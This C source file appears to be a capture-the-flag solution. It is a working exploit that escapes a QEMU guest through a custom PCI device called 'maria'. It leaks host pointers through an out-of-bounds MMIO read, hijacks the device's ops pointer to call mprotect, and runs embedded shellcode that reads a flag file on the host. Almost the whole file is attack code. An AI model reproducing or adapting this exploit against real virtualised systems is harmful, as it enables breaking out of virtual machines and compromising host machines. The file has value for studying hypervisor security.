#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>

#define PRINT_ERROR \
    do { \
        fprintf(stderr, "Error at line %d, file %s (%d) [%s]\n", \
        __LINE__, __FILE__, errno, strerror(errno)); exit(1); \
    } while(0)

// asm(pwnlib.shellcraft.amd64.linux.cat('/home/user/flag'))
// I don't think we can execve because of seccomp stuff qemu sets up (getting a SIGSYS when I do an execve)
unsigned char sc[] = {
    0x48, 0xb8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x50, 0x48,
    0xb8, 0x64, 0x73, 0x2e, 0x67, 0x6d, 0x60, 0x66, 0x01, 0x48, 0x31, 0x04,
    0x24, 0x48, 0xb8, 0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x2f, 0x75, 0x73, 0x50,
    0x6a, 0x02, 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x0f, 0x05, 0x41, 0xba,
    0xff, 0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a, 0x28, 0x58, 0x6a, 0x01,
    0x5f, 0x99, 0x0f, 0x05,
    0x58, 0x58, 0xc3  // My addition, rebalance stack and exit function to prevent crashing (pop rax; pop rax; ret)
};

#define SIZEOF_OPS 0x50
#define SIZEOF_PCIDEVICE 0xa30
#define BUFF_SIZE 0x2000
#define MARIA_MMIO_SIZE 0x10000

// From https://stackoverflow.com/a/45128487 (virt_to_phys_user.c)

typedef struct {
    uint64_t pfn : 55;
    unsigned int soft_dirty : 1;
    unsigned int file_page : 1;
    unsigned int swapped : 1;
    unsigned int present : 1;
} PagemapEntry;

/* Parse the pagemap entry for the given virtual address.
 *
 * @param[out] entry      the parsed entry
 * @param[in]  pagemap_fd file descriptor to an open /proc/pid/pagemap file
 * @param[in]  vaddr      virtual address to get entry for
 * @return 0 for success, 1 for failure
 */
int pagemap_get_entry(PagemapEntry *entry, int pagemap_fd, uintptr_t vaddr)
{
    size_t nread;
    ssize_t ret;
    uint64_t data;
    uintptr_t vpn;

    vpn = vaddr / sysconf(_SC_PAGE_SIZE);
    nread = 0;
    while (nread < sizeof(data)) {
        ret = pread(pagemap_fd, ((uint8_t*)&data) + nread, sizeof(data) - nread,
                vpn * sizeof(data) + nread);
        nread += ret;
        if (ret <= 0) {
            return 1;
        }
    }
    entry->pfn = data & (((uint64_t)1 << 55) - 1);
    entry->soft_dirty = (data >> 55) & 1;
    entry->file_page = (data >> 61) & 1;
    entry->swapped = (data >> 62) & 1;
    entry->present = (data >> 63) & 1;
    return 0;
}

/* Convert the given virtual address to physical using /proc/PID/pagemap.
 *
 * @param[out] paddr physical address
 * @param[in]  pid   process to convert for
 * @param[in] vaddr virtual address to get entry for
 * @return 0 for success, 1 for failure
 */
int virt_to_phys_user(uintptr_t *paddr, pid_t pid, uintptr_t vaddr)
{
    char pagemap_file[BUFSIZ];
    int pagemap_fd;

    snprintf(pagemap_file, sizeof(pagemap_file), "/proc/%ju/pagemap", (uintmax_t)pid);
    pagemap_fd = open(pagemap_file, O_RDONLY);
    if (pagemap_fd < 0) {
        return 1;
    }
    PagemapEntry entry;
    if (pagemap_get_entry(&entry, pagemap_fd, vaddr)) {
        return 1;
    }
    close(pagemap_fd);
    *paddr = (entry.pfn * sysconf(_SC_PAGE_SIZE)) + (vaddr % sysconf(_SC_PAGE_SIZE));
    return 0;
}

int main(int argc, char **argv) {    
    char *filename = "/sys/devices/pci0000:00/0000:00:05.0/resource0";

    int fd;
    if((fd = open(filename, O_RDWR | O_SYNC)) == -1) PRINT_ERROR;
    printf("%s opened.\n", filename);

    void *pcimem_gva = mmap(0, MARIA_MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    printf("PCI memory mapped to address 0x%08lx.\n", pcimem_gva);

    uintptr_t buf_gpa = 0;
    uintptr_t buf2_gpa = 0;
    void *buf_gva;
    while (true) {
        buf_gva = mmap(0, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
        // Page tables are allocated lazily so we need to write to that memory
        *(int *)buf_gva = 0xdeadbeef;
        *(int *)(buf_gva + 0x1000) = 0xdeadbeef;

        virt_to_phys_user(&buf_gpa, getpid(), (uintptr_t)buf_gva);
        virt_to_phys_user(&buf2_gpa, getpid(), (uintptr_t)buf_gva + 0x1000);
        if (buf2_gpa - buf_gpa == 0x1000) break;
    }
        
    printf("Physical address of buf in guest: 0x%lx.\n", buf_gpa);

    int offset = 0x58;  // Just big enough so we can leak and overwrite the ops and opaque pointers
    *(int *)(pcimem_gva + 8) = offset;
    *(int *)(pcimem_gva + 4) = (int)buf_gpa;
    printf("Reading into buf at offset 0x%x. Result: 0x%x.\n", *(int *)pcimem_gva);
    uintptr_t ops_hva = *(uintptr_t *)(buf_gva + BUFF_SIZE - 0x10);
    uintptr_t state_hva = *(uintptr_t *)(buf_gva + BUFF_SIZE - 0x8);
    printf("Leaked virtual addresses in host: state = 0x%lx, ops = 0x%lx.\n", state_hva, ops_hva);
    uintptr_t fake_ops_hva = state_hva + SIZEOF_PCIDEVICE + offset;
    uintptr_t sc_hva = fake_ops_hva + SIZEOF_OPS; 
    uintptr_t qemu_hva = ops_hva - 0xf1ff80;
    printf("Virtual address of qemu in host: 0x%lx.\n", qemu_hva);
    uintptr_t qemu_mprotect_rwx_hva = qemu_hva + 0xac23a4;

    *(uintptr_t *)buf_gva = qemu_mprotect_rwx_hva;  // maria_mmio_read
    *(uintptr_t *)(buf_gva + 8) = sc_hva; // maria_mmio_write
    memcpy(buf_gva + SIZEOF_OPS, &sc, sizeof(sc));
    *(uintptr_t *)(buf_gva + BUFF_SIZE - 0x10) = fake_ops_hva;
    *(uintptr_t *)(buf_gva + BUFF_SIZE - 0x8) = state_hva & 0xfffffffffffff000;
    printf("Triggering ops and opaque pointers overwrite via a write.\n");
    *(int *)pcimem_gva = 0xdeadbeef;

    printf("Triggering mprotect via a read.\n");
    printf("mprotect returns: 0x%x.\n", *(int *)(pcimem_gva+0xf000));

    printf("Triggering shellcode via a write.\n");
    *(int *)pcimem_gva = 0xdeadbeef; 

    // The ops and opaque pointer are in a bad state now, so subsequent
    // reads or writes to the maria device can lead to qemu crashing.
    // But we can still keep the machine alive as long as we don't intereact with that specific device
    // (like running the exploit again). But it's better than crashing the machine immediately.

    printf("Cleaning up.\n");
    if(munmap(pcimem_gva, MARIA_MMIO_SIZE) == -1) PRINT_ERROR;
    close(fd);
    if(munmap(buf_gva, BUFF_SIZE) == -1) PRINT_ERROR;

    printf("Done!\n");

    return 0;
}
